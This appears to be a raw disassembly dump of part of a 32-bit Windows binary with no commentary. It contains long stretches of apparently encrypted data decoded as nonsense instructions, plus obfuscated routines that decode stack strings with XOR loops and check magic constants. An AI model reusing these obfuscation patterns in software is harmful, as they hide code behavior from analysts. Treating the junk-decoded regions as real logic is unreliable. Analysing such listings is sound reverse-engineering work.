  411a41:	fwait
  411a42:	bound  esp,QWORD PTR [ebx+eax*8+0x68b8d94a]
  411a49:	leave  
  411a4a:	aaa    
  411a4b:	push   ebp
  411a4c:	adc    al,0x67
  411a4e:	ins    DWORD PTR es:[edi],dx
  411a4f:	ins    DWORD PTR es:[edi],dx
  411a50:	push   ebx
  411a51:	mov    al,0x98
  411a53:	adc    DWORD PTR [esi+0x14],0xf8757d83
  411a5a:	out    dx,al
  411a5b:	jb     0x411a27
  411a5d:	popa   
  411a5e:	ror    BYTE PTR [eax+ecx*2+0x2e126761],0x46
  411a66:	loop   0x4119eb
  411a68:	pop    ecx
  411a69:	cld    
  411a6a:	fwait
  411a6b:	xor    bh,ah
  411a6d:	push   esi
  411a6e:	loope  0x411a92
  411a70:	add    eax,0x903678e4
  411a75:	adc    al,BYTE PTR [ebp+0x7d]
  411a78:	cdq    
  411a79:	out    dx,al
  411a7a:	or     eax,0x2743a935
  411a7f:	outs   dx,DWORD PTR ds:[esi]
  411a81:	fild   WORD PTR [eax-0x1f]
  411a85:	pop    ecx
  411a86:	xor    eax,0x1f926c48
  411a8b:	mov    cl,0x9f
  411a8d:	repnz adc al,0xa3
  411a90:	xchg   BYTE PTR [esi+0x74541430],al
  411a96:	xchg   ecx,eax
  411a97:	sbb    eax,DWORD PTR [eax-0x25887fdb]
  411a9d:	mov    ah,0x31
  411a9f:	add    esp,eax
  411aa1:	xchg   ebp,eax
  411aa2:	dec    eax
  411aa3:	stc    
  411aa4:	cmp    eax,0x30211f8d
  411aa9:	xor    DWORD PTR [eax+0x738605f5],0x97f7e150
  411ab3:	jmp    0x6483:0xaa74b426
  411aba:	mov    dl,0xa
  411abc:	shl    BYTE PTR [ecx],cl
  411abe:	inc    esp
  411abf:	pusha  
  411ac0:	jbe    0x411aec
  411ac2:	cld    
  411ac3:	or     edx,DWORD PTR [ebp-0x414832dc]
  411ac9:	pop    DWORD PTR [ebx+0x72860b0c]
  411acf:	push   ss
  411ad0:	ret    0x99bb
  411ad3:	popa   
  411ad4:	and    eax,0xb5014dc5
  411ad9:	jge    0x411b4f
  411adb:	sbb    al,bh
  411add:	jno    0x411b50
  411adf:	mov    dl,0xf1
  411ae1:	or     al,ch
  411ae3:	loope  0x411a87
  411ae5:	in     eax,dx
  411ae6:	push   ecx
  411ae7:	scas   al,BYTE PTR es:[edi]
  411ae8:	ret    
  411ae9:	dec    ecx
  411aea:	popa   
  411aeb:	fwait
  411aec:	pop    ecx
  411aed:	cmp    BYTE PTR ds:0x605a7713,ah
  411af3:	xor    ebx,DWORD PTR [esi+0x73]
  411af6:	icebp  
  411af7:	mov    eax,ds:0x727c5e2e
  411afc:	jns    0x411b60
  411afe:	jne    0x411a80
  411b00:	mov    ebp,0xac4e495f
  411b05:	inc    eax
  411b06:	mov    edi,0xea827465
  411b0b:	push   ecx
  411b0c:	jb     0x411b21
  411b0e:	mov    edi,0x709f5f5e
  411b13:	retf   0x50b1
  411b16:	mov    esp,0xbd5510a2
  411b1b:	mov    dl,0x48
  411b1d:	aaa    
  411b1e:	add    al,0x42
  411b20:	(bad)  
  411b21:	rol    esp,cl
  411b23:	enter  0xc8ba,0x72
  411b27:	mov    edi,0x6694ab31
  411b2c:	arpl   di,ax
  411b2e:	(bad)  
  411b2f:	(bad)  
  411b31:	xor    dl,BYTE PTR [eax+0x2fe1c4c]
  411b37:	test   eax,0x7e7908da
  411b3c:	xor    DWORD PTR [ebp-0x3f],0xffffffaa
  411b40:	jb     0x411ba6
  411b42:	cmp    BYTE PTR [edi],0x1
  411b45:	xchg   edx,eax
  411b46:	xchg   ecx,eax
  411b47:	fild   QWORD PTR [edx+0x62]
  411b4a:	xchg   esi,eax
  411b4b:	jg     0x411b69
  411b4d:	loop   0x411ad0
  411b4f:	inc    eax
  411b50:	xor    ebx,DWORD PTR [edi-0x6c07a0aa]
  411b56:	mov    esi,0x7a0d0d18
  411b5b:	mov    esp,0x8e2babd2
  411b60:	sbb    eax,0x824ae760
  411b65:	je     0x411baf
  411b67:	mov    al,0x34
  411b6a:	das    
  411b6b:	fadd   st(5),st
  411b6d:	imul   edx,DWORD PTR [edx],0x20aebec0
  411b73:	in     eax,0x6c
  411b75:	dec    ebp
  411b76:	push   ebp
  411b77:	add    DWORD PTR [esi],edi
  411b79:	cdq    
  411b7a:	fsub   QWORD PTR [edi-0x4deae4b1]
  411b80:	ficom  WORD PTR [edx-0x44]
  411b83:	or     esp,DWORD PTR [esi]
  411b85:	sub    BYTE PTR [esi+ebp*4-0x33],bh
  411b89:	jecxz  0x411bac
  411b8b:	lods   al,BYTE PTR ds:[esi]
  411b8c:	into   
  411b8d:	and    BYTE PTR [edx-0x3d235210],ch
  411b93:	sar    BYTE PTR [edi-0x4e],1
  411b96:	jecxz  0x411bcc
  411b98:	test   al,0x89
  411b9a:	mov    cl,0xb1
  411b9c:	stc    
  411b9d:	adc    al,ch
  411b9f:	shl    DWORD PTR [ecx+edi*4+0x29],0x12
  411ba4:	sub    ch,BYTE PTR [esi]
  411ba6:	inc    ebx
  411ba7:	ret    
  411ba8:	mov    al,0xd4
  411baa:	inc    edx
  411bab:	xchg   esi,eax
  411bac:	inc    edi
  411bad:	push   ss
  411bae:	sbb    BYTE PTR [edx-0x23],0x85
  411bb2:	push   ebx
  411bb3:	or     esi,ecx
  411bb5:	dec    esi
  411bb6:	fs jecxz 0x411c2d
  411bb9:	ret    0x2812
  411bbc:	jmp    0x6756:0xc3745fa2
  411bc3:	jmp    0x9b72d6d1
  411bc8:	and    al,0x54
  411bca:	mov    ebp,0x329b2520
  411bcf:	mov    dl,0x13
  411bd1:	pop    es
  411bd2:	sub    al,0x11
  411bd4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bd5:	lea    esi,[esi+esi*2]
  411bd8:	retf   
  411bd9:	xor    dh,BYTE PTR [edi+0x5614683f]
  411bdf:	inc    esi
  411be0:	mov    dl,0xd
  411be2:	(bad)  
  411be3:	out    0x84,eax
  411be5:	or     al,0xbb
  411be7:	fcmove st,st(3)
  411be9:	test   BYTE PTR [ebx+0x33cbac91],dh
  411bef:	mov    al,0x1d
  411bf1:	sub    eax,edi
  411bf3:	sbb    ebx,esp
  411bf5:	sahf   
  411bf6:	xor    BYTE PTR [ecx+0x4b76b89a],cl
  411bfc:	stos   BYTE PTR es:[edi],al
  411bfd:	and    al,0x80
  411bff:	imul   esp,edx,0xffffffde
  411c02:	fadd   QWORD PTR [esi]
  411c04:	stc    
  411c05:	gs jnp 0x411c2e
  411c08:	ins    BYTE PTR es:[edi],dx
  411c09:	call   0xcac20c8c
  411c0e:	fsubr  QWORD PTR [ecx-0x27]
  411c11:	xchg   ebx,eax
  411c12:	fwait
  411c13:	add    cl,BYTE PTR ds:0xb4c2631f
  411c19:	jbe    0x411bb7
  411c1b:	add    DWORD PTR [ebx],edi
  411c1d:	fdivrp st(3),st
  411c1f:	lods   eax,DWORD PTR ds:[esi]
  411c20:	cmp    BYTE PTR [ebp-0x4a],dh
  411c23:	arpl   WORD PTR [ecx-0x77d9f653],si
  411c29:	pop    esp
  411c2a:	cs repnz pushf 
  411c2d:	mov    edi,0x707a04d9
  411c32:	sbb    bl,BYTE PTR [edx]
  411c34:	fwait
  411c35:	xor    al,0xa0
  411c37:	jb     0x411c96
  411c39:	cmp    BYTE PTR [ebp+esi*1-0x7f9253e0],ch
  411c40:	adc    eax,0xb1911af8
  411c45:	fisttp WORD PTR [ebx]
  411c47:	adc    eax,0x99d76581
  411c4c:	fistp  WORD PTR [esi+0x2]
  411c4f:	aas    
  411c50:	retf   
  411c51:	pop    ss
  411c52:	repnz cmp DWORD PTR [ebx+eax*1-0x6988dd9],edx
  411c5a:	lock ins BYTE PTR es:[edi],dx
  411c5c:	mov    dl,0x1a
  411c5e:	mov    BYTE PTR [ebx+0xd404144],dl
  411c64:	push   es
  411c65:	inc    ebx
  411c66:	fwait
  411c67:	jg     0x411c10
  411c69:	pop    ebx
  411c6a:	into   
  411c6b:	add    cl,BYTE PTR [esi-0xf]
  411c6e:	xor    al,0x18
  411c70:	push   es
  411c71:	lods   al,BYTE PTR ds:[esi]
  411c72:	jbe    0x411c4f
  411c74:	add    esp,DWORD PTR [ebp-0x77]
  411c77:	fldpi  
  411c79:	xchg   esi,eax
  411c7a:	addr16 jb 0x411c1f
  411c7d:	sbb    ch,BYTE PTR [ebx]
  411c7f:	test   BYTE PTR [di],ah
  411c82:	sar    DWORD PTR [edi+esi*2+0x6e],0xfd
  411c87:	xor    al,0xe5
  411c89:	jae    0x411c96
  411c8b:	mov    ah,0xdf
  411c8d:	inc    esi
  411c8e:	push   cs
  411c8f:	cld    
  411c90:	out    dx,al
  411c91:	jecxz  0x411ca4
  411c93:	test   eax,0x9e49bd7a
  411c98:	shl    DWORD PTR ss:0x8eb9f7e9,0x56
  411ca0:	cmp    edi,DWORD PTR [ebx+edx*2-0xb4a3ad0]
  411ca7:	and    edx,esp
  411ca9:	xchg   esi,eax
  411caa:	pop    esp
  411cab:	and    DWORD PTR [ecx+0x5fc4cbc4],esp
  411cb1:	hlt    
  411cb2:	into   
  411cb3:	mov    ch,0xaf
  411cb5:	fadd   QWORD PTR [ecx+edx*4+0x9]
  411cb9:	adc    ebp,0xf8548ca3
  411cbf:	xor    bh,BYTE PTR [eiz*2-0x1640fded]
  411cc6:	xchg   ecx,eax
  411cc7:	in     eax,0xea
  411cc9:	and    al,0x54
  411ccb:	dec    esi
  411ccc:	adc    dl,cl
  411cce:	pop    edi
  411ccf:	push   esp
  411cd0:	repnz cld 
  411cd2:	mov    eax,0xdf77b09d
  411cd7:	mov    ecx,0xb6abe60c
  411cdc:	jae    0x411d4d
  411cde:	pop    ss
  411cdf:	inc    ebx
  411ce0:	inc    esp
  411ce1:	inc    esp
  411ce2:	in     al,dx
  411ce3:	sbb    DWORD PTR [eax],ebp
  411ce5:	popf   
  411ce6:	cmp    al,0x73
  411ce8:	push   0xfffffff8
  411cea:	push   esp
  411ceb:	call   0x88a52c26
  411cf0:	mov    dh,BYTE PTR [edx]
  411cf2:	pop    esi
  411cf3:	jnp    0x411ce9
  411cf5:	call   esp
  411cf7:	cli    
  411cf8:	pop    edi
  411cf9:	retf   0xb6b0
  411cfc:	addr16 pop ebx
  411cfe:	fdivrp st(7),st
  411d00:	mov    eax,ds:0x2fe3648b
  411d05:	mov    ds:0x5ae0a79d,al
  411d0a:	(bad)  
  411d0b:	jge    0x411d45
  411d0d:	aas    
  411d0e:	xor    eax,0xf53fce14
  411d13:	pop    edi
  411d14:	jge    0x411cf5
  411d16:	inc    edx
  411d17:	cmp    bl,ch
  411d19:	pop    es
  411d1a:	cdq    
  411d1b:	lods   al,BYTE PTR ds:[esi]
  411d1c:	test   al,0x69
  411d1e:	and    esp,DWORD PTR ds:0xd43b8584
  411d24:	xor    DWORD PTR [ecx+0x8],esi
  411d27:	inc    edi
  411d28:	pop    ss
  411d29:	cmp    BYTE PTR [ebx-0x1002712e],0xd4
  411d30:	les    edi,FWORD PTR [edx-0x66]
  411d33:	mov    ds:0x876bee37,eax
  411d38:	test   BYTE PTR [ecx+0x40],0x71
  411d3c:	sub    bh,bh
  411d3e:	adc    DWORD PTR [esi-0x16f5eb38],ebx
  411d44:	ror    DWORD PTR [ebx+0x71d0e127],cl
  411d4a:	pop    es
  411d4b:	pop    es
  411d4c:	sbb    al,BYTE PTR [ecx-0x57]
  411d4f:	shl    cl,1
  411d51:	mov    bh,0x94
  411d53:	push   ds
  411d54:	inc    ebx
  411d55:	test   eax,0xa816c133
  411d5a:	jbe    0x411dc6
  411d5c:	dec    esi
  411d5d:	adc    edx,DWORD PTR [ecx+edx*2+0x1bd99252]
  411d64:	inc    ebp
  411d65:	les    esi,FWORD PTR [eax+0x2f2acd14]
  411d6b:	bound  esi,QWORD PTR [ebx+0xcd6982f]
  411d71:	icebp  
  411d72:	mov    WORD PTR [edx+edi*2-0x1cfec3b5],es
  411d79:	xor    DWORD PTR [ebx],edx
  411d7b:	cmp    al,0x6b
  411d7d:	cmp    ch,dl
  411d7f:	fwait
  411d80:	je     0x411df1
  411d82:	mov    ds:0xf30fe82,al
  411d87:	addr16 inc esi
  411d89:	bound  ebx,QWORD PTR [edi+edi*1]
  411d8c:	or     al,0x88
  411d8e:	iret   
  411d8f:	clc    
  411d90:	lds    ebp,FWORD PTR [edi+0x43c3a47]
  411d96:	mov    esi,edx
  411d98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d99:	pop    ebx
  411d9a:	(bad)  
  411d9b:	jl     0x411df3
  411d9d:	fstp   st(1)
  411d9f:	ds adc al,0x3b
  411da2:	retf   0x820f
  411da5:	daa    
  411da6:	fdiv   st(7),st
  411da8:	(bad)  
  411da9:	jmp    0x411df3
  411dae:	mov    ecx,DWORD PTR [ebp-0xc]
  411db1:	mov    DWORD PTR [ebp+0x8],ecx
  411db4:	jmp    0x411de6
  411db9:	mov    ecx,DWORD PTR [ebp+0x8]
  411dbc:	mov    edx,DWORD PTR [ebp-0x8]
  411dbf:	xor    ecx,eax
  411dc1:	xor    edx,eax
  411dc3:	sub    ecx,edx
  411dc5:	sub    ecx,esi
  411dc7:	xor    ecx,eax
  411dc9:	mov    DWORD PTR [ebp+0x8],ecx
  411dcc:	mov    ecx,DWORD PTR [ebp+0x8]
  411dcf:	mov    edx,DWORD PTR [ebp+0x8]
  411dd2:	imul   edx,edx,0x5708f2
  411dd8:	xor    ecx,eax
  411dda:	add    ecx,esi
  411ddc:	lea    ecx,[ebp+ecx*4-0x64]
  411de0:	mov    edi,DWORD PTR [ecx]
  411de2:	add    edx,edi
  411de4:	mov    DWORD PTR [ecx],edx
  411de6:	mov    ecx,DWORD PTR [ebp+0x8]
  411de9:	xor    ecx,eax
  411deb:	add    ecx,esi
  411ded:	jne    0x411db9
  411df3:	mov    ecx,DWORD PTR [ebp-0xc]
  411df6:	mov    DWORD PTR [ebp+0x8],ecx
  411df9:	jmp    0x411e2b
  411dfe:	mov    ecx,DWORD PTR [ebp+0x8]
  411e01:	mov    edx,DWORD PTR [ebp-0x8]
  411e04:	xor    ecx,eax
  411e06:	xor    edx,eax
  411e08:	sub    ecx,edx
  411e0a:	sub    ecx,esi
  411e0c:	xor    ecx,eax
  411e0e:	mov    DWORD PTR [ebp+0x8],ecx
  411e11:	mov    ecx,DWORD PTR [ebp+0x8]
  411e14:	mov    edx,DWORD PTR [ebp+0x8]
  411e17:	imul   edx,edx,0x5708f2
  411e1d:	xor    ecx,eax
  411e1f:	add    ecx,esi
  411e21:	lea    ecx,[ebp+ecx*4-0x64]
  411e25:	mov    edi,DWORD PTR [ecx]
  411e27:	add    edx,edi
  411e29:	mov    DWORD PTR [ecx],edx
  411e2b:	mov    ecx,DWORD PTR [ebp+0x8]
  411e2e:	xor    ecx,eax
  411e30:	add    ecx,esi
  411e32:	jne    0x411dfe
  411e38:	mov    ecx,DWORD PTR [ebp-0x8]
  411e3b:	mov    edx,DWORD PTR [ebp-0x20]
  411e3e:	xor    ecx,eax
  411e40:	lea    ecx,[ecx+edx*1+0x3272dd]
  411e47:	mov    DWORD PTR [ebp-0x20],ecx
  411e4a:	inc    DWORD PTR [ebp+0xc]
  411e4d:	mov    ecx,DWORD PTR [ebp-0x1c]
  411e50:	xor    ecx,eax
  411e52:	add    ecx,esi
  411e54:	jne    0x40f7af
  411e5a:	jmp    0x411ee3
  411e5f:	mov    ecx,DWORD PTR [ebp-0xc]
  411e62:	mov    DWORD PTR [ebp+0x8],ecx
  411e65:	jmp    0x411e97
  411e6a:	mov    ecx,DWORD PTR [ebp+0x8]
  411e6d:	mov    edx,DWORD PTR [ebp-0x8]
  411e70:	xor    ecx,eax
  411e72:	xor    edx,eax
  411e74:	sub    ecx,edx
  411e76:	sub    ecx,esi
  411e78:	xor    ecx,eax
  411e7a:	mov    DWORD PTR [ebp+0x8],ecx
  411e7d:	mov    ecx,DWORD PTR [ebp+0x8]
  411e80:	mov    edx,DWORD PTR [ebp+0x8]
  411e83:	imul   edx,edx,0x5708f2
  411e89:	xor    ecx,eax
  411e8b:	add    ecx,esi
  411e8d:	lea    ecx,[ebp+ecx*4-0x64]
  411e91:	mov    edi,DWORD PTR [ecx]
  411e93:	add    edx,edi
  411e95:	mov    DWORD PTR [ecx],edx
  411e97:	mov    ecx,DWORD PTR [ebp+0x8]
  411e9a:	xor    ecx,eax
  411e9c:	add    ecx,esi
  411e9e:	jne    0x411e6a
  411ea4:	jmp    0x411eef
  411ea9:	mov    ecx,DWORD PTR [ebp+0x8]
  411eac:	mov    edx,DWORD PTR [ebp-0x8]
  411eaf:	xor    ecx,eax
  411eb1:	xor    edx,eax
  411eb3:	sub    ecx,edx
  411eb5:	sub    ecx,esi
  411eb7:	xor    ecx,eax
  411eb9:	mov    DWORD PTR [ebp+0x8],ecx
  411ebc:	mov    ecx,DWORD PTR [ebp+0x8]
  411ebf:	mov    edx,DWORD PTR [ebp+0x8]
  411ec2:	xor    ecx,eax
  411ec4:	imul   edx,edx,0x5708f2
  411eca:	add    ecx,esi
  411ecc:	lea    ecx,[ebp+ecx*4-0x64]
  411ed0:	mov    edi,DWORD PTR [ecx]
  411ed2:	add    edx,edi
  411ed4:	mov    DWORD PTR [ecx],edx
  411ed6:	mov    ecx,DWORD PTR [ebp+0x8]
  411ed9:	xor    ecx,eax
  411edb:	add    ecx,esi
  411edd:	jne    0x411ea9
  411ee3:	mov    ecx,DWORD PTR [ebp-0x8]
  411ee6:	xor    ecx,eax
  411ee8:	mov    eax,DWORD PTR [ebp+0x10]
  411eeb:	add    ecx,esi
  411eed:	mov    DWORD PTR [eax],ecx
  411eef:	pop    edi
  411ef0:	pop    esi
  411ef1:	pop    ebx
  411ef2:	leave  
  411ef3:	ret    0xc
	...
  411f02:	add    BYTE PTR [eax],al
  411f04:	pop    esi
  411f05:	mov    eax,0x4dd0
  411f0a:	add    BYTE PTR [eax],al
  411f0c:	xor    bl,BYTE PTR [edi]
  411f0e:	add    DWORD PTR [eax],eax
  411f10:	add    DWORD PTR [eax],eax
  411f12:	add    BYTE PTR [eax],al
  411f14:	add    DWORD PTR [eax],eax
  411f16:	add    BYTE PTR [eax],al
  411f18:	add    DWORD PTR [eax],eax
  411f1a:	add    BYTE PTR [eax],al
  411f1c:	sub    BYTE PTR [edi],bl
  411f1e:	add    DWORD PTR [eax],eax
  411f20:	sub    al,0x1f
  411f22:	add    DWORD PTR [eax],eax
  411f24:	xor    BYTE PTR [edi],bl
  411f26:	add    DWORD PTR [eax],eax
  411f28:	test   eax,0x3e000029
  411f2d:	pop    ds
  411f2e:	add    DWORD PTR [eax],eax
  411f30:	add    BYTE PTR [eax],al
  411f32:	push   ebx
  411f33:	jns    0x411fa2
  411f35:	bound  ebp,QWORD PTR [edi+0x6c]
  411f38:	imul   esp,DWORD PTR [ebx+0x45],0x3f006578
  411f3f:	inc    ebx
  411f40:	ins    BYTE PTR es:[edi],dx
  411f41:	outs   dx,DWORD PTR ds:[esi]
  411f42:	jae    0x411fa9
  411f44:	push   edi
  411f45:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  411f4c:	popa   
  411f4d:	je     0x411fb8
  411f4f:	outs   dx,DWORD PTR ds:[esi]
  411f50:	outs   dx,BYTE PTR ds:[esi]
  411f51:	inc    ebx
  411f52:	ins    BYTE PTR es:[edi],dx
  411f53:	outs   dx,DWORD PTR ds:[esi]
  411f54:	jae    0x411fbb
  411f56:	push   edi
  411f57:	imul   eax,DWORD PTR [eax],0x40042a0
  411f5d:	mov    al,ds:0xa0080042
  411f62:	inc    edx
  411f63:	add    BYTE PTR [eax+eiz*4],cl
  411f66:	inc    edx
  411f67:	add    BYTE PTR [eax],dl
  411f69:	mov    al,ds:0xa0140042
  411f6e:	inc    edx
  411f6f:	add    BYTE PTR [eax],bl
  411f71:	mov    al,ds:0xa01c0042
  411f76:	inc    edx
  411f77:	add    BYTE PTR [eax],al
  411f79:	rol    BYTE PTR [edx+0x0],1
  411f7c:	add    al,0xd0
  411f7e:	inc    edx
  411f7f:	add    BYTE PTR [eax],cl
  411f81:	rol    BYTE PTR [edx+0x0],1
  411f84:	or     al,0xd0
  411f86:	inc    edx
  411f87:	add    BYTE PTR [eax],dl
  411f89:	rol    BYTE PTR [edx+0x0],1
  411f8c:	adc    al,0xd0
  411f8e:	inc    edx
  411f8f:	add    BYTE PTR [eax],bl
  411f91:	rol    BYTE PTR [edx+0x0],1
  411f94:	sbb    al,0xd0
  411f96:	inc    edx
	...
  411fa3:	add    BYTE PTR [esi-0x48],bl
  411fa6:	ror    BYTE PTR [ebp+0x0],1
  411fa9:	add    BYTE PTR [eax],al
  411fab:	add    BYTE PTR [edx],al
  411fad:	add    BYTE PTR [eax],al
  411faf:	add    BYTE PTR ds:0x30000000,bh
  411fb5:	and    BYTE PTR [ecx],al
  411fb7:	add    BYTE PTR [eax],dh
  411fb9:	adc    al,0x1
  411fbb:	add    BYTE PTR [eax],al
  411fbd:	nop
  411fbe:	inc    edx
  411fbf:	add    BYTE PTR [eax+edx*4],al
  411fc2:	inc    edx
  411fc3:	add    BYTE PTR [eax],cl
  411fc5:	nop
  411fc6:	inc    edx
  411fc7:	add    BYTE PTR [eax+edx*4],cl
  411fca:	inc    edx
  411fcb:	add    BYTE PTR [eax],dl
  411fcd:	nop
  411fce:	inc    edx
  411fcf:	add    BYTE PTR [eax+edx*4],dl
  411fd2:	inc    edx
  411fd3:	add    BYTE PTR [eax],bl
  411fd5:	nop
  411fd6:	inc    edx
  411fd7:	add    BYTE PTR [eax+edx*4],bl
  411fda:	inc    edx
  411fdb:	add    BYTE PTR [eax],ah
  411fdd:	nop
  411fde:	inc    edx
  411fdf:	add    BYTE PTR [eax+edx*4],ah
  411fe2:	inc    edx
  411fe3:	add    BYTE PTR [eax],ch
  411fe5:	nop
  411fe6:	inc    edx
  411fe7:	add    BYTE PTR [eax],al
  411fe9:	mov    al,0x42
  411feb:	add    BYTE PTR [eax+esi*4],al
  411fee:	inc    edx
  411fef:	add    BYTE PTR [eax],cl
  411ff1:	mov    al,0x42
  411ff3:	add    BYTE PTR [eax+esi*4],cl
  411ff6:	inc    edx
  411ff7:	add    BYTE PTR [eax],dl
  411ff9:	mov    al,0x42
  411ffb:	add    BYTE PTR [eax+esi*4],dl
  411ffe:	inc    edx
  411fff:	add    BYTE PTR [eax],bl
  412001:	mov    al,0x42
  412003:	add    BYTE PTR [eax+esi*4],bl
  412006:	inc    edx
  412007:	add    BYTE PTR [eax],al
  412009:	rol    BYTE PTR [edx+0x0],0x4
  41200d:	rol    BYTE PTR [edx+0x0],0x8
  412011:	rol    BYTE PTR [edx+0x0],0xc
  412015:	rol    BYTE PTR [edx+0x0],0x10
  412019:	rol    BYTE PTR [edx+0x0],0x14
  41201d:	rol    BYTE PTR [edx+0x0],0x18
  412021:	rol    BYTE PTR [edx+0x0],0x1c
  412025:	rol    BYTE PTR [edx+0x0],0x0
  412029:	add    BYTE PTR [eax],al
  41202b:	add    BYTE PTR [eax],al
  41202d:	add    BYTE PTR [eax],al
  41202f:	add    BYTE PTR [edx+0x53],dl
  412032:	inc    esp
  412033:	push   ebx
  412034:	retf   0x5aac
  412037:	ja     0x412033
  412039:	retf   0x4950
  41203c:	lods   eax,DWORD PTR ds:[esi]
  41203d:	fnstcw WORD PTR [ebx-0x58140f39]
  412043:	pop    esp
  412044:	add    DWORD PTR [eax],eax
  412046:	add    BYTE PTR [eax],al
  412048:	inc    ebx
  412049:	cmp    bl,BYTE PTR [ebx+eax*2+0x75]
  41204d:	jb     0x4120c1
  41204f:	outs   dx,BYTE PTR gs:[esi]
  412051:	je     0x412097
  412053:	popa   
  412054:	je     0x4120b7
  412056:	pop    esp
  412057:	dec    ebp
  412058:	outs   dx,DWORD PTR ds:[esi]
  412059:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  412061:	ins    BYTE PTR es:[edi],dx
  412062:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  412069:	dec    esi
  41206a:	gs ja  0x41206d
  41206d:	mov    edx,DWORD PTR [ebp-0x14]
  412070:	sub    esp,0xe4
  412076:	push   ebx
  412077:	mov    eax,ebx
  412079:	xchg   ecx,eax
  41207a:	mov    eax,DWORD PTR [ebp+0x8]
  41207d:	cmp    eax,0xf89c85b5
  412082:	jne    0x412416
  412088:	mov    eax,DWORD PTR [ebp+0xc]
  41208b:	cmp    eax,0xf89c85b2
  412090:	jne    0x412416
  412096:	mov    eax,DWORD PTR [ebp+0x24]
  412099:	mov    DWORD PTR [ebp-0x4],eax
  41209c:	mov    BYTE PTR [ebp-0x18],0x3
  4120a0:	mov    BYTE PTR [ebp-0x17],0x1e
  4120a4:	mov    BYTE PTR [ebp-0x16],0x5
  4120a8:	mov    BYTE PTR [ebp-0x15],0x4f
  4120ac:	mov    BYTE PTR [ebp-0x14],0x4c
  4120b0:	mov    BYTE PTR [ebp-0x13],0x7a
  4120b4:	mov    BYTE PTR [ebp-0x20],0xf1
  4120b8:	mov    BYTE PTR [ebp-0x1f],0xf
  4120bc:	mov    BYTE PTR [ebp-0x1e],0x1
  4120c0:	mov    BYTE PTR [ebp-0x1d],0xc
  4120c4:	mov    BYTE PTR [ebp-0x1c],0x4f
  4120c8:	mov    BYTE PTR [ebp-0x1b],0x4c
  4120cc:	mov    BYTE PTR [ebp-0x1a],0x7a
  4120d0:	mov    BYTE PTR [ebp-0x28],0xf
  4120d4:	mov    BYTE PTR [ebp-0x27],0x2
  4120d8:	push   esi
  4120d9:	mov    BYTE PTR [ebp-0x26],0x6
  4120dd:	mov    BYTE PTR [ebp-0x25],0xf3
  4120e1:	push   edi
  4120e2:	mov    BYTE PTR [ebp-0x24],0x1d
  4120e6:	mov    BYTE PTR [ebp-0x23],0xa
  4120ea:	push   0x71
  4120ec:	mov    BYTE PTR [ebp-0x22],0x5
  4120f0:	xor    edi,edi
  4120f2:	mov    BYTE PTR [ebp-0x21],0x7a
  4120f6:	xor    esi,esi
  4120f8:	pop    edx
  4120f9:	mov    eax,0xf5
  4120fe:	lea    ecx,[ebp+esi*1-0x18]
  412102:	movzx  ebx,BYTE PTR [ecx]
  412105:	xor    ebx,edx
  412107:	add    ebx,eax
  412109:	inc    esi
  41210a:	mov    BYTE PTR [ecx],bl
  41210c:	cmp    esi,0x6
  41210f:	jb     0x4120fe
  412111:	xor    esi,esi
  412113:	lea    ecx,[ebp+esi*1-0x20]
  412117:	movzx  ebx,BYTE PTR [ecx]
  41211a:	xor    ebx,edx
  41211c:	add    ebx,eax
  41211e:	inc    esi
  41211f:	mov    BYTE PTR [ecx],bl
  412121:	cmp    esi,0x7
  412124:	jb     0x412113
  412126:	xor    esi,esi
  412128:	lea    ecx,[ebp+esi*1-0x28]
  41212c:	movzx  ebx,BYTE PTR [ecx]
  41212f:	xor    ebx,edx
  412131:	add    ebx,eax
  412133:	push   0x8
  412135:	mov    BYTE PTR [ecx],bl
  412137:	inc    esi
  412138:	pop    ecx
  412139:	cmp    esi,ecx
  41213b:	jb     0x412128
  41213d:	lea    eax,[ebp-0x2c]
  412140:	mov    DWORD PTR [ebp-0x8],eax
  412143:	mov    esi,DWORD PTR [ebp-0x8]
  412146:	mov    eax,0x7113fcef
  41214b:	mov    DWORD PTR [esi],eax
  41214d:	mov    esi,DWORD PTR [ebp-0x2c]
  412150:	cmp    esi,eax
  412152:	jne    0x412162
  412154:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41215b:	mov    DWORD PTR [ebp-0x8],0xf89c85e0
  412162:	mov    eax,DWORD PTR [ebp-0x4]
  412165:	mov    eax,DWORD PTR [eax+0x18c]
  41216b:	cmp    DWORD PTR [eax],edi
  41216d:	jne    0x4123bf
  412173:	mov    eax,DWORD PTR [ebp-0x4]
  412176:	mov    eax,DWORD PTR [eax+0x17c]
  41217c:	mov    DWORD PTR [eax],edi
  41217e:	mov    eax,DWORD PTR [ebp-0x4]
  412181:	mov    eax,DWORD PTR [eax+0x180]
  412187:	mov    DWORD PTR [eax],edi
  412189:	mov    edi,0x4e3d
  41218e:	mov    eax,0x4f8e
  412193:	mov    WORD PTR [ebp-0x78],ax
  412197:	mov    eax,edi
  412199:	mov    WORD PTR [ebp-0x76],ax
  41219d:	add    eax,0x41
  4121a0:	mov    WORD PTR [ebp-0x74],ax
  4121a4:	lea    eax,[edi+0x1]
  4121a7:	mov    WORD PTR [ebp-0x72],ax
  4121ab:	mov    eax,0x4fad
  4121b0:	mov    WORD PTR [ebp-0x70],ax
  4121b4:	lea    eax,[edi-0xc]
  4121b7:	mov    WORD PTR [ebp-0x6e],ax
  4121bb:	add    eax,0x4b
  4121be:	mov    WORD PTR [ebp-0x6c],ax
  4121c2:	lea    eax,[edi-0xa]
  4121c5:	mov    WORD PTR [ebp-0x6a],ax
  4121c9:	mov    eax,edi
  4121cb:	mov    WORD PTR [ebp-0x68],ax
  4121cf:	add    eax,0xfffffff5
  4121d2:	mov    WORD PTR [ebp-0x66],ax
  4121d6:	mov    eax,0x99fe
  4121db:	mov    WORD PTR [ebp-0x64],ax
  4121df:	mov    eax,0x8281
  4121e4:	mov    WORD PTR [ebp-0x62],ax
  4121e8:	mov    eax,0xd78c
  4121ed:	mov    WORD PTR [ebp-0x60],ax
  4121f1:	add    eax,0x14
  4121f4:	mov    WORD PTR [ebp-0x5e],ax
  4121f8:	mov    eax,0x27a3
  4121fd:	mov    WORD PTR [ebp-0x5c],ax
  412201:	mov    eax,0x47a3
  412206:	mov    WORD PTR [ebp-0x5a],ax
  41220a:	lea    eax,[edi-0xd]
  41220d:	mov    WORD PTR [ebp-0x58],ax
  412211:	mov    DWORD PTR [ebp-0x10],0xf306020f
